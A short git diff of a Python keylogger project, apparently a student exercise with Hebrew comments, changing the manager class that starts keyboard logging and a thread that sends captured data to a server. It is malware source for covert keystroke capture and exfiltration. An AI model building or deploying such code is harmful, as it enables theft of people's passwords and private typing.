@@ -4,7 +4,6 @@ from file_writer import FileWriter
 import time
 from datetime import datetime
 import threading
-from create_encryption_key import CreateKey
 import socket
 from network_writer import NetworkSaver
 
@@ -21,13 +20,16 @@ class KeyloggerManager:
 
 
     def start(self):          # פונקציה להפעלת כל תכונות הKeyloggerManager
-        self.running = True
-        # מתחיל האזנה למקלדת
-        self.keylogger_listener.start_logging()
-        # יצירת תהליכון האחראי לריצת הפונקציה get_update() הרץ במקביל לתהליכון  send_data()
-        threading.Thread(target=self.get_update,daemon=True).start()
-        # מתחיל תהליכון לשליחת הנתונים לשרת
-        threading.Thread(target=self.send_data, daemon=True).start()
+        try:
+            self.running = True
+            # מתחיל האזנה למקלדת
+            self.keylogger_listener.start_logging()
+            # יצירת תהליכון האחראי לריצת הפונקציה get_update() הרץ במקביל לתהליכון  send_data()
+            threading.Thread(target=self.get_update,daemon=True).start()
+            # מתחיל תהליכון לשליחת הנתונים לשרת
+            threading.Thread(target=self.send_data, daemon=True).start()
+        except:
+            print("starting error")
 
 
 
